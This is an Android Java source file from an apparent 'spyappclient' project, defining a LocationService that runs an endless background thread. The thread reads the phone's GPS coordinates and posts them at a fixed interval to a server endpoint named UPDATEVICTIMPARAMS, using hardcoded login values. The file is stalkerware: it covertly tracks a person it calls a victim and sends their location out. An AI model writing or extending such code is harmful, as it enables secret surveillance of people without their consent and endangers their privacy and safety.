package com.example.alber.spyappclient;

import android.Manifest;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class LocationService extends IntentService {
    private Executor executor= Executors.newFixedThreadPool(20);;
    private GPSTracker mGPS;

    LocationService() {
        super(LocationService.class.getSimpleName());
    }


    @Override
    protected void onHandleIntent(@Nullable Intent intent) {

    }

    protected void getLoc() {
        Log.d("while","running");
        new Thread(new Runnable() {
            @Override
            public void run() {
                while(true){
                    Log.d("while","running");
                    ServerPost serverPost=new ServerPost(URLS.UPDATEVICTIMPARAMS.url,getApplicationContext(),"tomeczek","albi");
                    serverPost.addToPost("cordinatesy", ( String.valueOf(mGPS.getLongitude())));
                    serverPost.addToPost("cordinatesx",String.valueOf(mGPS.getLatitude()));
                    serverPost.postCords();
                    try {
                        Thread.sleep(Properties.LocationInterval);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();

    }

    public void onStart(Intent intent, int startId) {
        // TODO Auto-generated method stub
        super.onStart(intent, startId);

        mGPS = new GPSTracker(this);

        Log.d("started","true");
        getLoc();
        this.stopSelf();
    }

    @Override
    public void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();
    }

}
